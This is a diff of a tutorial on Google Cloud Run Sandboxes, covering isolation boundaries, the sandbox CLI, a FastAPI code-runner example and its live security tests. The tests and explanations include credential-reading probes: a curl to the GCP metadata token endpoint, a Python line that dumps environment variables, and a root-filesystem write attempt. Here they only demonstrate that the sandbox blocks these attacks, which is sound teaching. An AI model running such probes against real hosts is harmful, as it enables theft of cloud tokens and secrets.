@@ -1,292 +1,246 @@
 # Getting Started with Google Cloud Run Sandboxes
-### A Comprehensive Guide to In-Container Isolation, Micro-Sandboxing, and Production AI Execution Planes
+### A Hands-On Guide to Safely Running Untrusted Code and AI Agent Workloads
 
 ---
 
 ## Table of Contents
 1. [Introduction](#1-introduction)
-2. [Why Cloud Run Sandboxes?](#2-why-cloud-run-sandboxes)
-   - [The Fatal Flaw of `eval()` and Raw Subprocesses](#the-fatal-flaw-of-eval-and-raw-subprocesses)
-   - [The Zero-Trust Triad](#the-zero-trust-triad)
-   - [Economics & Latency: MicroVMs vs In-Instance Sandboxes](#economics--latency-microvms-vs-in-instance-sandboxes)
-   - [Architectural Security Boundaries (Diagram)](#architectural-security-boundaries)
-3. [Step-by-Step: Enabling and Operating Sandboxes](#3-step-by-step-enabling-and-operating-sandboxes)
+2. [Why Do We Need Sandboxes?](#2-why-do-we-need-sandboxes)
+   - [Why `eval()` and Subprocesses Are Dangerous](#why-eval-and-subprocesses-are-dangerous)
+   - [The Three Security Boundaries (The Zero-Trust Model)](#the-three-security-boundaries-the-zero-trust-model)
+   - [How It Compares to Traditional VMs](#how-it-compares-to-traditional-vms)
+3. [Step-by-Step: Getting Started](#3-step-by-step-getting-started)
    - [Prerequisites](#prerequisites)
-   - [Enabling via CLI and YAML](#enabling-via-cli-and-yaml)
-   - [The Sandbox CLI Anatomy](#the-sandbox-cli-anatomy)
-   - [Lifecycle Modes & Mount Topologies (Diagrams)](#lifecycle-modes--mount-topologies)
-4. [101 Example: Safe Code Runner Microservice](#4-101-example-safe-code-runner-microservice)
-   - [Application Code & Dockerfile](#application-code--dockerfile)
-   - [Deployment Walkthrough](#deployment-walkthrough)
-   - [Verifying the Security Boundaries Live](#verifying-the-security-boundaries-live)
-5. [End-to-End Real-World Use Cases](#5-end-to-end-real-world-use-cases)
-   - [Use Case 1: Educational Autograder & Competitive Programming Judge](#use-case-1-educational-autograder--competitive-programming-judge)
-   - [Use Case 2: AI-Assisted Autonomous Web Scraper & Research Agent](#use-case-2-ai-assisted-autonomous-web-scraper--research-agent)
-   - [Use Case 3: SecOps Incident Response & Malware Payload Detonator](#use-case-3-secops-incident-response--malware-payload-detonator)
-6. [Best Practices & Operational Checklist](#6-best-practices--operational-checklist)
+   - [Enabling Sandboxes on Cloud Run](#enabling-sandboxes-on-cloud-run)
+   - [How the `sandbox` CLI Works](#how-the-sandbox-cli-works)
+   - [Execution Modes and Storage Options](#execution-modes-and-storage-options)
+4. [A 101 Example: A Safe Code Execution Service](#4-a-101-example-a-safe-code-execution-service)
+   - [The Code Walkthrough](#the-code-walkthrough)
+   - [Deploying to Cloud Run](#deploying-to-cloud-run)
+   - [Testing the Security Boundaries Live](#testing-the-security-boundaries-live)
+5. [Three Real-World Use Cases](#5-three-real-world-use-cases)
+   - [Use Case 1: Automated Coding Assignment Judge (Autograder)](#use-case-1-automated-coding-assignment-judge-autograder)
+   - [Use Case 2: AI Web Research Scraper (With SSRF Defense)](#use-case-2-ai-web-research-scraper-with-ssrf-defense)
+   - [Use Case 3: SecOps Malware & Script Detonation Sandbox](#use-case-3-secops-malware--script-detonation-sandbox)
+6. [Best Practices and Gotchas](#6-best-practices-and-gotchas)
 7. [References & Further Reading](#7-references--further-reading)
 
 ---
 
 ## 1. Introduction
 
-Modern cloud architectures are undergoing a fundamental transformation. For years, cloud-native design centered around stateless microservices processing predictable payloads. Today, the rapid rise of **autonomous AI agents**, **LLM code interpreters**, **multi-tenant SaaS platforms**, and **user-extensible workflows** requires systems to execute dynamic, arbitrary, and fundamentally untrusted code at runtime.
+If you have built an AI agent, an automated coding platform, or a SaaS product where users can write custom automation scripts, you have probably run into this question:
 
-When an AI agent writes a Python script to compute statistical correlations, or when an e-commerce platform executes a customer's custom checkout rule, executing that code in the host container environment introduces severe attack vectors:
-- Host filesystem tampering.
-- Environment variable and secret exfiltration.
-- SSRF attacks against Cloud Instance Metadata endpoints (`169.254.169.254`).
-- Denial of Service (DoS) via unconstrained CPU/memory consumption.
+> **How do I safely execute code that I didn't write?**
 
-Until recently, engineering teams faced an uncomfortable trade-off: spin up dedicated Virtual Machines or isolated multi-tenant Kubernetes clusters (costly and suffering from 15–60 second cold starts) or use third-party microVM SaaS providers.
+When an LLM generates a Python script to analyze a dataset, or when a student submits code for a programming assignment, that code is fundamentally untrusted. If you run it directly on your server, a buggy script or a clever attacker can:
+- Steal your database credentials and API keys stored in environment variables.
+- Query the Google Cloud metadata server to grab cloud access tokens.
+- Delete or overwrite files on your system.
+- Connect out to the internet to download malware or exfiltrate private data.
 
-**Google Cloud Run Sandboxes (Public Preview)** introduce native, sub-second, micro-isolated execution boundaries **directly inside your existing second-generation Cloud Run container instances**. By leveraging a lightweight virtualization boundary, Cloud Run enables host applications to spawn sealed sandboxes in milliseconds, sharing the container's allocated CPU and RAM with zero additional infrastructure costs.
+In the past, solving this was painful. You had to spin up dedicated virtual machines (which take 30 to 60 seconds to boot) or use third-party microVM services that add cost and latency.
+
+**Google Cloud Run Sandboxes (now in Public Preview)** solve this directly. They give you a secure, disposable sandbox **right inside your existing Cloud Run container instance**. 
+
+A sandbox starts in under 200 milliseconds, runs your untrusted code in strict isolation, and shares your container's existing CPU and memory so you do not pay anything extra.
 
 ```mermaid
 flowchart LR
-    A["<b>1. Bare Metal</b><br/>Physical Isolation<br/><i>Hours to provision</i>"] --> 
-    B["<b>2. Virtual Machines</b><br/>Hypervisor Isolation<br/><i>Minutes to boot</i>"] --> 
-    C["<b>3. Containers</b><br/>Namespace Isolation<br/><i>Seconds to start</i>"] --> 
-    D["<b>4. Cloud Run Sandboxes</b><br/>In-Container Isolation<br/><i>Milliseconds to launch</i>"]
+    A["Bare Metal<br/>Hours to set up"] --> B["Virtual Machines<br/>Minutes to boot"]
+    B --> C["Containers<br/>Seconds to start"]
+    C --> D["Cloud Run Sandboxes<br/>Milliseconds to launch"]
 ```
 
 ---
 
-## 2. Why Cloud Run Sandboxes?
+## 2. Why Do We Need Sandboxes?
 
-### The Fatal Flaw of `eval()` and Raw Subprocesses
+### Why `eval()` and Subprocesses Are Dangerous
 
-A common anti-pattern in early agentic prototypes is executing model-generated code directly via Python’s `eval()`, `exec()`, or `subprocess.run(["python3", "-c", code])`. 
+When developers first experiment with AI agents that run code, they often start with something simple like this:
 
 ```python
-# ⚠️ CATASTROPHIC ANTI-PATTERN: Raw in-process execution
-eval(user_supplied_code)
-# Or
-subprocess.run(["python3", "-c", llm_generated_code])
+# ⚠️ NEVER DO THIS WITH UNTRUSTED CODE
+eval(user_code)
+
+# Or even:
+import subprocess
+subprocess.run(["python3", "-c", user_code])
 ```
 
-Why is this fatal in production?
-1. **Shared Memory Space**: `eval()` runs inside your interpreter process. It can mutate global objects, hijack running web frameworks, or read in-memory tokens.
-2. **Access to Environment Variables**: Raw `subprocess.run()` inherits `os.environ`. An attacker can run `import os; print(os.environ)` to extract database passwords, private API keys, and service tokens.
-3. **Access to GCP Metadata Server**: By default, any process on Cloud Run can query `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` and obtain a short-lived Google OAuth token with the service account's full privileges.
-4. **Permanent Filesystem Pollution**: Malicious code can overwrite host binaries or plant backdoor webhooks in writable directories.
+While this works in a local demo, it creates severe security vulnerabilities in production:
 
-### The Zero-Trust Triad
+1. **Memory access**: `eval()` runs directly inside your application's Python process. Untrusted code can modify global state, inspect memory, or crash your web server.
+2. **Leaking secrets**: When you call `subprocess.run()`, the child process inherits all of your host environment variables (`os.environ`). A script containing `import os; print(os.environ)` will dump your database passwords and API keys.
+3. **Cloud token theft**: Any process running inside a standard Cloud Run container can reach Google's instance metadata server at `http://169.254.169.254`. An attacker can query this endpoint to steal a short-lived OAuth token and take over your Google Cloud project.
+4. **Filesystem tampering**: The process can delete your application code, write backdoors, or fill up your disk.
 
-Cloud Run Sandboxes solve this through a **Zero-Trust by Default** architecture built around three non-negotiable boundaries:
+### The Three Security Boundaries (The Zero-Trust Model)
+
+Cloud Run Sandboxes fix these problems by enforcing three strict security boundaries by default:
 
 ```mermaid
-flowchart TB
-    subgraph HostContainer ["Cloud Run Host Container (Second Generation)"]
-        direction TB
-        HostApp["Host Application<br/><i>(FastAPI / Agent Harness)</i>"]
-        HostEnv["Host Environment Variables<br/><i>(Secrets, API Keys, DB Passwords)</i>"]
-        GCPMeta["Google Cloud Metadata Server<br/><code>169.254.169.254</code>"]
+flowchart TD
+    Host["Your Main Cloud Run Container<br/>(FastAPI App, Database Passwords, API Keys)"]
+    Metadata["Google Cloud Metadata Server<br/>(169.254.169.254)"]
+    Internet["Public Internet & External APIs"]
+    
+    Sandbox["Isolated Sandbox<br/>(Untrusted Python / Bash Code)"]
 
-        subgraph SandboxBoundary ["Isolated Sandbox Boundary"]
-            direction TB
-            SandboxProc["Untrusted Process<br/><code>/usr/bin/python3</code>"]
-            TmpfsOverlay["Volatile Overlay /tmp<br/><i>(Active with --write)</i>"]
-        end
-    end
-
-    PublicInternet["Public Internet / External APIs"]
-
-    HostApp -->|"Spawns (sandbox do)"| SandboxProc
-    SandboxProc -.->|"❌ Blocked: Token Access"| GCPMeta
-    SandboxProc -.->|"❌ Blocked: Invisible Env"| HostEnv
-    SandboxProc -.->|"❌ Blocked: Read-Only Root"| HostContainer
-    SandboxProc -.->|"❌ Blocked: Deny Egress (Default)"| PublicInternet
-    SandboxProc -->|"✅ Allowed: with --allow-egress"| PublicInternet
+    Host -->|Runs command via 'sandbox do'| Sandbox
+    Sandbox -.->|BLOCKED: Cannot read host env vars| Host
+    Sandbox -.->|BLOCKED: Cannot access metadata or tokens| Metadata
+    Sandbox -.->|BLOCKED: No internet by default| Internet
+    Sandbox -->|ALLOWED: Only if --allow-egress is set| Internet
 ```
 
-1. **Credential & Environment Isolation**:
-   - Sandboxes **do not inherit** environment variables from the host container.
-   - Sandboxes are **strictly cut off** from the GCP Instance Metadata Server (`169.254.169.254`). Even if untrusted code executes `curl http://169.254.169.254`, the connection is dropped immediately.
-2. **Deny-by-Default Network Egress**:
-   - All outbound network calls (to the public internet or private VPCs) are blocked by default. 
-   - Code cannot phone home to Command & Control (C2) servers or exfiltrate scraped data unless `--allow-egress` is explicitly granted.
-3. **Ephemeral, Isolated Filesystem**:
-   - The host container root filesystem is visible to the sandbox as **read-only**.
-   - If the code attempts to modify existing files or create new ones without configuration, the kernel denies the write with `Read-only file system`.
-   - Passing `--write` provides an ephemeral `tmpfs` copy-on-write overlay that is completely destroyed when the sandbox exits.
-   - For controlled data exchange, explicit directory mounts can be passed using `--mount type=bind,...`.
+1. **Credentials & Environment Isolation**:
+   The sandbox does not get any of your host environment variables. Even better: the Google Cloud metadata server (`169.254.169.254`) is completely blocked. If code inside the sandbox tries to fetch a token, the connection is instantly rejected.
+2. **No Internet Access (Deny-by-Default)**:
+   By default, all outbound network traffic from the sandbox is blocked. Code cannot phone home to an attacker's server or download unauthorized files. If your workload genuinely needs internet access (for example, to scrape a webpage), you must explicitly enable it with the `--allow-egress` flag.
+3. **Read-Only Filesystem**:
+   The sandbox can see the files in your container image, but only in **read-only** mode. If it tries to create or modify a file, the Linux kernel stops it with a `Read-only file system` error. If your code needs to write temporary files, you can pass the `--write` flag, which gives it a temporary in-memory filesystem that gets wiped clean the moment the sandbox exits.
 
-### Economics & Latency: MicroVMs vs In-Instance Sandboxes
+### How It Compares to Traditional VMs
 
-| Metric | Traditional Dedicated VM / Node | External MicroVM SaaS | Cloud Run Sandboxes |
+| What You Might Consider | Traditional VMs | External Sandbox SaaS | Cloud Run Sandboxes |
 | :--- | :--- | :--- | :--- |
-| **Startup Latency** | 30s – 120s | 800ms – 2500ms | **< 200ms – 500ms** |
-| **Infrastructure Overhead** | Dedicated GCE / GKE nodes | Separate external vendor API | **Zero extra infrastructure** |
-| **Cost Model** | Hourly VM billing | Per-sandbox invocation fees | **Shares allocated Cloud Run CPU & RAM** |
-| **Data Locality** | Network hop across clusters | Egress across internet to third-party | **In-memory / Local host disk** |
-| **Security Boundary** | Hypervisor (KVM) | MicroVM (Firecracker) | **Micro-sandbox inside Cloud Run Gen2** |
+| **Startup time** | 30–60 seconds | 1–3 seconds | **Under 200–500ms** |
+| **Extra cost** | Hourly VM costs | Per-call API fees | **Free (uses existing container CPU/RAM)** |
+| **Setup complexity** | Complex VM pools | Extra vendor API keys | **Just a single CLI flag** |
+| **Network overhead** | Extra network hops | Data leaves your cloud | **Runs locally on your instance** |
 
 ---
 
-## 3. Step-by-Step: Enabling and Operating Sandboxes
+## 3. Step-by-Step: Getting Started
 
 ### Prerequisites
 
+To follow along, make sure you have:
 1. A Google Cloud project with billing enabled.
 2. The `gcloud` CLI installed with the `beta` components:
    ```bash
    gcloud components install beta
    ```
-3. The Cloud Run API enabled:
+3. Cloud Run enabled in your project:
    ```bash
    gcloud services enable run.googleapis.com
    ```
 
-### Enabling via CLI and YAML
+### Enabling Sandboxes on Cloud Run
 
-Cloud Run Sandboxes require the **second-generation execution environment (`gen2`)**. 
+Cloud Run Sandboxes require the **second-generation execution environment (`gen2`)**. Enabling them is as simple as adding the `--sandbox-launcher` flag when deploying.
 
-#### Option A: Google Cloud CLI (`gcloud`)
-When deploying or updating a service, pass the `--sandbox-launcher` flag:
-
+#### Using the `gcloud` CLI:
 ```bash
-gcloud beta run deploy my-agent-service \
+gcloud beta run deploy my-service \
     --source . \
     --region us-central1 \
     --execution-environment gen2 \
     --sandbox-launcher \
-    --memory 2Gi \
-    --cpu 2
+    --memory 1Gi \
+    --cpu 1
 ```
 
-To update an existing service:
+If you already have a running Cloud Run service, you can turn sandboxes on with an update command:
 ```bash
-gcloud beta run services update my-agent-service \
+gcloud beta run services update my-service \
     --sandbox-launcher \
     --region us-central1
 ```
 
-#### Option B: Declarative Knative YAML
-In your service specification, enable the `sandboxLauncher` attribute under `spec.template.spec.containers`:
+#### Using YAML:
+If you prefer declarative configuration, set `sandboxLauncher: true` in your container spec:
 
 ```yaml
 apiVersion: serving.knative.dev/v1
 kind: Service
 metadata:
-  name: my-agent-service
-  annotations:
-    run.googleapis.com/launch-stage: BETA
+  name: my-service
 spec:
   template:
     spec:
       containers:
-      - image: us-central1-docker.pkg.dev/my-project/repo/agent:latest
-        name: agent-container
+      - image: us-central1-docker.pkg.dev/my-project/repo/image:latest
         sandboxLauncher: true
-        resources:
-          limits:
-            cpu: "2"
-            memory: "2Gi"
 ```
 
-Apply with:
+### How the `sandbox` CLI Works
+
+When you enable the sandbox launcher, Cloud Run injects a helper binary into your container at `/usr/local/gcp/bin/sandbox`. You can call this binary from Python, Node.js, Go, or shell scripts.
+
+Here are the main commands you will use:
+
+#### 1. `sandbox do` (One-shot execution)
+Spins up a new sandbox, runs your command, and destroys the sandbox as soon as it finishes:
 ```bash
-gcloud run services replace service.yaml
+sandbox do -- /usr/bin/python3 -c "print(1 + 1)"
 ```
 
-### The Sandbox CLI Anatomy
-
-When `--sandbox-launcher` is enabled, Cloud Run automatically mounts an optimized binary at:
-```text
-/usr/local/gcp/bin/sandbox
+#### 2. `sandbox run` (Background daemon)
+Starts a named sandbox in the background so you can run multiple commands inside the same environment:
+```bash
+sandbox run my-box --detach -- /bin/bash -c "sleep 10m"
 ```
 
-#### Core Subcommands
+#### 3. `sandbox exec` (Run commands in an active sandbox)
+Executes a command inside a background sandbox you started earlier. This is extremely fast (under 5 milliseconds):
+```bash
+sandbox exec my-box -- /usr/bin/python3 -c "print('hello from inside')"
+```
 
-1. **`sandbox do`**: Executes an ephemeral, one-shot command. Spins up the sandbox, runs the command, and destroys the sandbox immediately upon completion.
-   ```bash
-   sandbox do [FLAGS] -- <COMMAND> [ARGS...]
-   ```
+#### 4. `sandbox tar` (Export file changes)
+Saves any files that were created or modified inside a sandbox into a standard tar archive:
+```bash
+sandbox tar my-box --file=/tmp/saved-work.tar
+```
 
-2. **`sandbox run`**: Launches a named sandbox in the background (using `--detach`) that remains active to accept subsequent executions.
-   ```bash
-   sandbox run <SANDBOX_NAME> --detach [FLAGS] -- <BACKGROUND_CMD>
-   ```
+#### 5. `sandbox delete` (Clean up)
+Stops and removes a background sandbox:
+```bash
+sandbox delete my-box
+```
 
-3. **`sandbox exec`**: Runs a command inside an existing, running detached sandbox.
-   ```bash
-   sandbox exec <SANDBOX_NAME> -- <COMMAND> [ARGS...]
-   ```
+### Execution Modes and Storage Options
 
-4. **`sandbox tar`**: Creates a compressed tar archive of all modified and created files in a sandbox's overlay.
-   ```bash
-   sandbox tar <SANDBOX_NAME> --file=<DESTINATION_PATH.tar>
-   ```
-
-5. **`sandbox delete`**: Destroys and cleans up a detached sandbox.
-   ```bash
-   sandbox delete <SANDBOX_NAME>
-   ```
-
-#### Essential Flags Reference
-
-| Flag | Purpose | Default Behavior |
-| :--- | :--- | :--- |
-| `--write` | Enables a writable `tmpfs` overlay for filesystem modifications. | Read-only filesystem. |
-| `--allow-egress` | Grants outbound network connectivity to internet/VPC. | All outbound traffic blocked. |
-| `--mount` | Mounts host directories into the sandbox: `type=bind,source=<SRC>,destination=<DEST>[,readonly]`. | No shared host directories. |
-| `--env KEY=VAL` | Injects an explicit environment variable into the sandbox. | Zero host environment variables. |
-| `--export-tar=<PATH>` | Exports modified files to a tarball upon exit (`sandbox do`). | Overlay files discarded. |
-| `--import-tar=<PATH>` | Pre-populates the sandbox filesystem from a tar archive before running. | Clean container baseline. |
-| `--sync-tar=<PATH>` | Imports tar before execution and exports modifications to it upon exit. | No filesystem syncing. |
-
-### Lifecycle Modes & Mount Topologies
+Depending on what you are building, you have two execution modes:
 
 ```mermaid
-flowchart TB
-    subgraph ModeA ["Mode 1: One-Shot Execution (sandbox do)"]
-        direction LR
-        A1["1. Host Runs<br/><code>sandbox do -- &lt;cmd&gt;</code>"] --> A2["2. Instant Spawn<br/><i>(&lt;200ms)</i>"] --> A3["3. Command Executes<br/><i>Isolated Kernel</i>"] --> A4["4. Auto-Destroy<br/><i>Overlay Discarded</i>"]
+flowchart TD
+    subgraph Mode1 ["Mode 1: One-Shot Task (sandbox do)"]
+        A["Call 'sandbox do'"] --> B["Spins up in under 200ms"]
+        B --> C["Runs code in isolation"]
+        C --> D["Sandbox deleted immediately"]
     end
 
-    subgraph ModeB ["Mode 2: Detached Stateful Execution (sandbox run)"]
-        direction LR
-        B1["1. Host Starts Daemon<br/><code>sandbox run --detach</code>"] --> B2["2. Idle Daemon Ready<br/><i>(e.g., sleep 30m)</i>"] --> B3["3. Fast Executions<br/><code>sandbox exec</code> (&lt;5ms)"] --> B4["4. Export Overlay<br/><code>sandbox tar</code>"] --> B5["5. Teardown<br/><code>sandbox delete</code>"]
+    subgraph Mode2 ["Mode 2: Background Sandbox (sandbox run)"]
+        E["Call 'sandbox run --detach'"] --> F["Pre-warmed sandbox stays alive"]
+        F --> G["Run fast commands via 'sandbox exec'"]
+        G --> H["Save files via 'sandbox tar'"]
+        H --> I["Shut down via 'sandbox delete'"]
     end
 ```
 
+And four ways to handle files:
+
 ```mermaid
-flowchart TB
-    subgraph Storage ["Filesystem Sharing Topologies"]
-        direction TB
-
-        subgraph S1 ["1. Default Baseline"]
-            direction LR
-            H1["Host Container Root (/)"] -->|"Read-Only Access"| SB1["Sandbox Baseline (Read-Only)"]
-        end
-
-        subgraph S2 ["2. Ephemeral Overlay"]
-            direction LR
-            H2["--write Flag"] -->|"Allocates RAM tmpfs"| SB2["Writable /tmp (Discarded on Exit)"]
-        end
-
-        subgraph S3 ["3. Host Directory Mount"]
-            direction LR
-            H3["Host Directory (/tmp/data)"] -->|"--mount type=bind,readonly"| SB3["Sandbox Path (/mnt/data)"]
-        end
-
-        subgraph S4 ["4. Tarball Archive Sync"]
-            direction LR
-            H4["Host Tar Archive (state.tar)"] -->|"--sync-tar=state.tar"| SB4["Two-Way State Sync"]
-        end
-    end
+flowchart TD
+    HostDisk["Host Container Filesystem"] -->|Read-only by default| SB_Root["Sandbox Root (/)"]
+    TmpfsFlag["--write flag"] -->|Temporary in-memory storage| SB_Tmp["Writable /tmp (deleted on exit)"]
+    MountFlag["--mount flag"] -->|Share specific host folder| SB_Mount["Mounted Folder (/mnt/...)"]
+    TarFlag["--sync-tar flag"] -->|Save and restore files| SB_Tar["Preserved Workspace Across Calls"]
 ```
 
 ---
 
-## 4. 101 Example: Safe Code Runner Microservice
+## 4. A 101 Example: A Safe Code Execution Service
 
-Let’s implement a minimal, production-grade microservice that accepts untrusted code payloads and runs them inside a Cloud Run Sandbox.
+Let's build a minimal FastAPI service that accepts Python or Bash code over HTTP and runs it inside a sandbox.
 
-### Application Code & Dockerfile
+All code for this example is located in [`examples/01-hello-sandbox-101/`](examples/01-hello-sandbox-101/).
 
-All code for this example is available in [`examples/01-hello-sandbox-101/`](examples/01-hello-sandbox-101/).
+### The Code Walkthrough
 
 #### `main.py`
 ```python
@@ -300,6 +254,7 @@ from pydantic import BaseModel, Field
 
 app = FastAPI(title="Cloud Run Sandbox 101 Runner")
 
+# Check if the sandbox binary is available
 SANDBOX_BIN = "/usr/local/gcp/bin/sandbox" if os.path.exists("/usr/local/gcp/bin/sandbox") else shutil.which("sandbox")
 
 class ExecutionRequest(BaseModel):
@@ -319,29 +274,29 @@ class ExecutionResponse(BaseModel):
 
 @app.post("/run", response_model=ExecutionResponse)
 def run_code(req: ExecutionRequest):
-    start_time = time.time()
+    start = time.time()
     
     if not SANDBOX_BIN:
         return ExecutionResponse(
             success=False,
             exit_code=-1,
             stdout="",
-            stderr="ERROR: 'sandbox' binary not found. Deploy with --sandbox-launcher.",
+            stderr="ERROR: 'sandbox' binary not found. Make sure you deployed with --sandbox-launcher.",
             execution_time_ms=0,
             is_sandboxed=False,
         )
 
-    # Choose interpreter
-    inner_cmd = ["/usr/bin/python3", "-c", req.code] if req.language == "python" else ["/bin/bash", "-c", req.code]
+    # Pick the interpreter
+    interpreter = ["/usr/bin/python3", "-c", req.code] if req.language == "python" else ["/bin/bash", "-c", req.code]
 
-    # Assemble sandbox invocation
+    # Build the sandbox command
     cmd = [SANDBOX_BIN, "do"]
     if req.allow_write:
         cmd.append("--write")
     if req.allow_egress:
         cmd.append("--allow-egress")
     cmd.append("--")
-    cmd.extend(inner_cmd)
+    cmd.extend(interpreter)
 
     try:
         proc = subprocess.run(cmd, capture_output=True, text=True, timeout=req.timeout_sec)
@@ -350,7 +305,7 @@ def run_code(req: ExecutionRequest):
             exit_code=proc.returncode,
             stdout=proc.stdout,
             stderr=proc.stderr,
-            execution_time_ms=(time.time() - start_time) * 1000,
+            execution_time_ms=(time.time() - start) * 1000,
             is_sandboxed=True,
         )
     except subprocess.TimeoutExpired as e:
@@ -358,25 +313,37 @@ def run_code(req: ExecutionRequest):
             success=False,
             exit_code=124,
             stdout=e.stdout or "",
-            stderr=f"Execution timed out after {req.timeout_sec}s",
-            execution_time_ms=(time.time() - start_time) * 1000,
+            stderr=f"Execution timed out after {req.timeout_sec} seconds.",
+            execution_time_ms=(time.time() - start) * 1000,
             is_sandboxed=True,
         )
 
-# Security verification test endpoints
+# Health check endpoint
+@app.get("/")
+def health():
+    return {
+        "status": "healthy",
+        "sandbox_available": bool(SANDBOX_BIN),
+        "sandbox_path": SANDBOX_BIN or "Not Found"
+    }
+
+# Built-in endpoints to test security isolation
 @app.post("/test/env-isolation")
 def test_env_isolation():
+    """Verify that host environment variables cannot be read inside the sandbox."""
     os.environ["HOST_SUPER_SECRET"] = "secret-token-do-not-leak"
     probe = "import os; print('HOST_SUPER_SECRET=' + os.getenv('HOST_SUPER_SECRET', '<NOT_FOUND>'))"
     return run_code(ExecutionRequest(language="python", code=probe))
 
 @app.post("/test/metadata-isolation")
 def test_metadata_isolation():
+    """Verify that the GCP metadata server is blocked."""
     probe = "curl -s --connect-timeout 2 http://169.254.169.254/computeMetadata/v1/instance/ || echo 'METADATA_ACCESS_BLOCKED'"
     return run_code(ExecutionRequest(language="bash", code=probe, allow_egress=False))
 
 @app.post("/test/fs-isolation")
 def test_fs_isolation():
+    """Verify that writing to the root filesystem fails without --write."""
     probe = "echo 'malicious write' > /test_probe.txt"
     return run_code(ExecutionRequest(language="bash", code=probe, allow_write=False))
 ```
@@ -391,6 +358,7 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     bash \
     && rm -rf /var/lib/apt/lists/*
 
+# Ensure python3 is available at /usr/bin/python3
 RUN ln -sf $(which python3) /usr/bin/python3
 
 WORKDIR /app
@@ -403,9 +371,9 @@ EXPOSE 8080
 CMD ["python3", "main.py"]
 ```
 
-### Deployment Walkthrough
+### Deploying to Cloud Run
 
-Deploy directly from source to Cloud Run with `--sandbox-launcher`:
+Deploy this service using `gcloud`:
 
 ```bash
 gcloud beta run deploy sandbox-hello-101 \
@@ -418,27 +386,26 @@ gcloud beta run deploy sandbox-hello-101 \
     --cpu 1
 ```
 
-Once deployment finishes, retrieve your service URL:
+Once deployment completes, grab your service URL:
 ```bash
 SERVICE_URL=$(gcloud run services describe sandbox-hello-101 --region us-central1 --format='value(status.url)')
 echo "Service is live at: ${SERVICE_URL}"
 ```
 
-> **Verified Live Deployment**:
-> Service URL: `https://sandbox-hello-101-415458962931.us-central1.run.app`
-> Project: `gcp-experiments-349209` (Region: `us-central1`)
+> **Verified Live Service**:
+> `https://sandbox-hello-101-415458962931.us-central1.run.app`
 
-### Verifying the Security Boundaries Live
+### Testing the Security Boundaries Live
 
-Let’s issue curl requests against the live deployed service to verify each security boundary:
+Let's test our live deployment using `curl` to prove each security guarantee:
 
-#### Test 1: Successful Computation
+#### Test 1: Normal Python calculation
 ```bash
 curl -s -X POST "https://sandbox-hello-101-415458962931.us-central1.run.app/run" \
   -H "Content-Type: application/json" \
   -d '{"language": "python", "code": "import math; print([math.factorial(i) for i in range(7)])"}'
 ```
-**Live Output (Verified):**
+**Output:**
 ```json
 {
   "success": true,
@@ -449,13 +416,14 @@ curl -s -X POST "https://sandbox-hello-101-415458962931.us-central1.run.app/run"
   "is_sandboxed": true
 }
 ```
+The code executed safely in 649 milliseconds.
 
-#### Test 2: Host Environment Variable Snooping
-The host container sets `HOST_SUPER_SECRET=secret-token-do-not-leak`. Let’s verify the sandbox cannot read it:
+#### Test 2: Can code steal our host environment variables?
+The host has `HOST_SUPER_SECRET=secret-token-do-not-leak`. Let's see if the sandbox can read it:
 ```bash
 curl -s -X POST "https://sandbox-hello-101-415458962931.us-central1.run.app/test/env-isolation"
 ```
-**Live Output (Verified):**
+**Output:**
 ```json
 {
   "success": true,
@@ -468,12 +436,12 @@ curl -s -X POST "https://sandbox-hello-101-415458962931.us-central1.run.app/test
 ```
 *Result: Host environment variables are completely invisible inside the sandbox.*
 
-#### Test 3: GCP Metadata Server Access
-Attempting to reach the Google Cloud metadata server (`169.254.169.254`):
+#### Test 3: Can code reach the Google Cloud metadata server?
+Let's try querying `http://169.254.169.254`:
 ```bash
 curl -s -X POST "https://sandbox-hello-101-415458962931.us-central1.run.app/test/metadata-isolation"
 ```
-**Live Output (Verified):**
+**Output:**
 ```json
 {
   "success": true,
@@ -484,14 +452,14 @@ curl -s -X POST "https://sandbox-hello-101-415458962931.us-central1.run.app/test
   "is_sandboxed": true
 }
 ```
-*Result: Connection to 169.254.169.254 is instantly dropped by the sandbox network filter.*
+*Result: The connection to 169.254.169.254 is instantly dropped.*
 
-#### Test 4: Filesystem Tampering
-Attempting to write to root without `--write`:
+#### Test 4: Can code tamper with the filesystem?
+Let's try writing a file to `/test_probe.txt` without `--write`:
 ```bash
 curl -s -X POST "https://sandbox-hello-101-415458962931.us-central1.run.app/test/fs-isolation"
 ```
-**Live Output (Verified):**
+**Output:**
 ```json
 {
   "success": false,
@@ -502,325 +470,176 @@ curl -s -X POST "https://sandbox-hello-101-415458962931.us-central1.run.app/test
   "is_sandboxed": true
 }
 ```
-*Result: Root filesystem modifications are blocked.*
+*Result: The filesystem is strictly read-only.*
 
 ---
 
-## 5. End-to-End Real-World Use Cases
+## 5. Three Real-World Use Cases
 
-Now let's explore three unique production-grade architectures that demonstrate the full power of Cloud Run Sandboxes across different industry domains.
+Now that we understand the basics, let's explore three realistic production scenarios built from scratch.
 
 ---
 
-### Use Case 1: Educational Autograder & Competitive Programming Judge
+### Use Case 1: Automated Coding Assignment Judge (Autograder)
+
+If you run an educational platform or interview coding challenge (like LeetCode), you need to grade code submitted by students.
 
 ```mermaid
 sequenceDiagram
     autonumber
-    actor Student as Student Candidate
+    actor Student as Student
     participant API as Autograder Service
-    participant Disk as Host Submissions (/tmp)
-    participant Box as Sandbox Process
+    participant Disk as Temp Folder
+    participant Box as Sandbox
 
-    Student->>API: POST /grade (solution code)
-    API->>Disk: Writes solution.py to temp dir
-    API->>Box: Spawns sandbox (dual read-only mounts)
-    Note over API,Box: /app/test_suite -> /mnt/test_suite (ro)<br/>/tmp/sub -> /mnt/student (ro)
-    Box->>Box: Executes runner against hidden tests
-    Box-->>API: Returns JSON verdict on stdout
-    API->>Disk: Deletes temporary submission folder
-    API-->>Student: Returns test breakdown & metrics
+    Student->>API: Submits solution code
+    API->>Disk: Saves code to a temporary folder
+    API->>Box: Runs sandbox with read-only test suite
+    Note over Box: Tests run without network access
+    Box-->>API: Returns test results (JSON)
+    API->>Disk: Cleans up temporary folder
+    API-->>Student: Returns grade and feedback
 ```
 
-#### The Architecture & Challenge
-Online judges (like LeetCode, HackerRank, or university autograders) must execute arbitrary student submissions against hidden test cases. Common challenges include:
-1. Students trying to read the test harness code or secret answer keys on the server.
-2. Students writing infinite loops or memory bombs.
-3. Students using sockets to phone home answers.
-4. Malicious submissions trying to overwrite server files.
+#### The Problem
+Students might submit code that:
+- Runs in an infinite loop (`while True: pass`).
+- Tries to read the answer keys or test harness files from disk.
+- Makes network requests to ask an external server for answers.
+- Attempts to steal server environment variables.
 
